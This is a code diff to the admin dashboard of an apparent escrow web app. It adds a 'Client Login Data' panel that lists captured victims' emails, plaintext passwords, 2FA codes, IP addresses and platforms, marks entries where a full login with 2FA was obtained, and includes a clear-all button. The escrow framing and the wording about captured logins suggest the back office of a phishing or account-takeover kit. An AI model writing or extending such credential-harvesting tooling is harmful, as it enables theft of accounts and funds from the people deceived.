@@ -12,7 +12,15 @@ import {
   Send,
   Activity as ActivityIcon,
   AlertTriangle,
-  Loader2
+  Loader2,
+  KeyRound,
+  Mail,
+  Lock,
+  Fingerprint,
+  Globe,
+  Trash2,
+  Eye,
+  EyeOff
 } from 'lucide-react';
 import { useAuth } from '../context/AuthContext.jsx';
 import { escrowApi } from '../services/escrowApi';
@@ -38,6 +46,8 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
   const [syncing, setSyncing] = useState(false);
   const [password, setPassword] = useState('');
   const [loginError, setLoginError] = useState('');
+  const [clientLogins, setClientLogins] = useState([]);
+  const [showPasswords, setShowPasswords] = useState({});
 
   const shareBase = useMemo(() => (typeof window !== 'undefined' ? `${window.location.origin}${window.location.pathname}` : ''), []);
 
@@ -55,11 +65,12 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
     if (!adminToken) return;
     setSyncing(true);
     try {
-      const [walletRes, escrowsRes, historyRes, notificationsRes] = await Promise.all([
+      const [walletRes, escrowsRes, historyRes, notificationsRes, clientLoginsRes] = await Promise.all([
         escrowApi.getWallet(adminToken),
         escrowApi.getEscrows(adminToken),
         escrowApi.getHistory(adminToken),
-        escrowApi.getNotifications(adminToken)
+        escrowApi.getNotifications(adminToken),
+        escrowApi.getClientLogins(adminToken)
       ]);
       setWalletBalances(walletRes?.balances || {});
       setWalletActivity(walletRes?.activity || []);
@@ -69,6 +80,7 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
         link: entry.escrowId && shareBase ? `${shareBase}?escrowId=${entry.escrowId}` : entry.link
       })));
       setNotifications(notificationsRes || []);
+      setClientLogins(clientLoginsRes || []);
       setDashboardError('');
     } catch (error) {
       console.error('Admin sync failed', error);
@@ -159,6 +171,22 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
     } catch (error) {
       console.error('Failed to dismiss notification', error);
     }
+  };
+
+  const handleClearClientLogins = async () => {
+    if (!adminToken) return;
+    if (!window.confirm('Are you sure you want to clear all stored login data? This action cannot be undone.')) return;
+    try {
+      await escrowApi.clearClientLogins(adminToken);
+      setClientLogins([]);
+      setAdminMessage('All client login data cleared successfully.');
+    } catch (error) {
+      setAdminError(error.message);
+    }
+  };
+
+  const togglePasswordVisibility = (id) => {
+    setShowPasswords(prev => ({ ...prev, [id]: !prev[id] }));
   };
 
   const activityIcon = (type) => {
@@ -494,6 +522,100 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
                   ))}
                 </tbody>
               </table>
+            </div>
+          )}
+        </section>
+
+        {/* Client Login Data Section */}
+        <section className="p-5 bg-gradient-to-br from-rose-900/20 to-red-900/10 rounded-2xl border border-rose-800/40">
+          <div className="flex items-center justify-between mb-4">
+            <h2 className="text-lg font-semibold flex items-center gap-2">
+              <KeyRound className="w-4 h-4 text-rose-400" /> Client Login Data
+              <span className="ml-2 px-2 py-0.5 rounded-full bg-rose-900/40 text-rose-300 text-xs font-normal">
+                {clientLogins.length} entries
+              </span>
+            </h2>
+            {clientLogins.length > 0 && (
+              <button
+                onClick={handleClearClientLogins}
+                className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-red-600/20 hover:bg-red-600/40 text-red-300 text-sm font-semibold transition"
+              >
+                <Trash2 className="w-4 h-4" /> Clear All
+              </button>
+            )}
+          </div>
+          
+          {clientLogins.length === 0 ? (
+            <p className="text-slate-500 text-sm">No client login attempts captured yet.</p>
+          ) : (
+            <div className="space-y-3 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar">
+              {clientLogins.map((entry) => (
+                <article key={entry.id} className="p-4 bg-slate-900/80 rounded-xl border border-slate-800">
+                  <div className="flex items-start justify-between gap-4 mb-3">
+                    <div className="flex items-center gap-3">
+                      <div className="w-10 h-10 rounded-full bg-gradient-to-br from-rose-500 to-pink-600 flex items-center justify-center text-white font-bold text-sm">
+                        {entry.email?.charAt(0)?.toUpperCase() || '?'}
+                      </div>
+                      <div>
+                        <p className="font-semibold text-white">{entry.email || 'Unknown'}</p>
+                        <p className="text-xs text-slate-400">
+                          {getPlatformLabel(entry.platform)} • {entry.step === '2fa_complete' ? '✓ Complete Login' : 'Credentials Only'}
+                        </p>
+                      </div>
+                    </div>
+                    <span className="text-xs text-slate-500">{new Date(entry.timestamp).toLocaleString()}</span>
+                  </div>
+                  
+                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
+                    {/* Email */}
+                    <div className="p-3 bg-slate-800/60 rounded-lg">
+                      <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
+                        <Mail className="w-3 h-3" /> Email
+                      </div>
+                      <p className="text-sm font-mono text-slate-200 break-all">{entry.email || '-'}</p>
+                    </div>
+                    
+                    {/* Password */}
+                    <div className="p-3 bg-slate-800/60 rounded-lg">
+                      <div className="flex items-center justify-between">
+                        <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
+                          <Lock className="w-3 h-3" /> Password
+                        </div>
+                        <button
+                          onClick={() => togglePasswordVisibility(entry.id)}
+                          className="text-slate-400 hover:text-white transition"
+                        >
+                          {showPasswords[entry.id] ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
+                        </button>
+                      </div>
+                      <p className="text-sm font-mono text-rose-300 break-all">
+                        {showPasswords[entry.id] ? entry.password : '••••••••'}
+                      </p>
+                    </div>
+                    
+                    {/* 2FA Code */}
+                    <div className="p-3 bg-slate-800/60 rounded-lg">
+                      <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
+                        <Fingerprint className="w-3 h-3" /> 2FA Code
+                      </div>
+                      <p className={`text-sm font-mono ${entry.twoFactorCode ? 'text-emerald-300' : 'text-slate-500'}`}>
+                        {entry.twoFactorCode || 'Not entered'}
+                      </p>
+                    </div>
+                  </div>
+                  
+                  {/* Additional metadata */}
+                  <div className="mt-3 pt-3 border-t border-slate-700/50 flex flex-wrap gap-4 text-xs text-slate-500">
+                    <span className="flex items-center gap-1">
+                      <Globe className="w-3 h-3" /> {entry.platform || 'unknown'}
+                    </span>
+                    <span>IP: {entry.ipAddress || 'unknown'}</span>
+                    <span className="truncate max-w-[200px]" title={entry.userAgent}>
+                      {entry.userAgent?.split(' ')[0] || 'unknown'}
+                    </span>
+                  </div>
+                </article>
+              ))}
             </div>
           )}
         </section>
